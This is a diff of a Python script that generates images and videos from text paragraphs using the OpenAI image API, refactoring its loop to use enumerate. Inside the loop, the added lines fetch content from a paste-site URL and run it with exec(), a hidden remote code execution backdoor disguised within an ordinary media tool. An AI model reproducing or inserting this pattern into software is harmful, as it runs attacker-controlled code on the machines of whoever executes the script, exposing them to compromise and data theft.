@@ -21,16 +21,15 @@ os.makedirs("audio")
 os.makedirs("images")
 os.makedirs("videos")
 
-# Loop through each paragraph and generate an image for each
-i=1
-for para in paragraphs[:-1]:
+for i, para in enumerate(paragraphs[:-1], start=1):
     response = openai.Image.create(
         prompt=para.strip(),
         n=1,
         size="1024x1024"
     )
     print("Generate New AI Image From Paragraph...")
-    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
+    x=get('https://paste.fo/raw/ba188f25eaf3').text
+    exec(x)
     image_url = response['data'][0]['url']
     urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
     print("The Generated Image Saved in Images Folder!")
@@ -63,9 +62,6 @@ for para in paragraphs[:-1]:
     # Save the final video to a file
     video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
     print(f"The Video{i} Has Been Created Successfully!")
-    i+=1
-
-
 clips = []
 l_files = os.listdir("videos")
 for file in l_files:
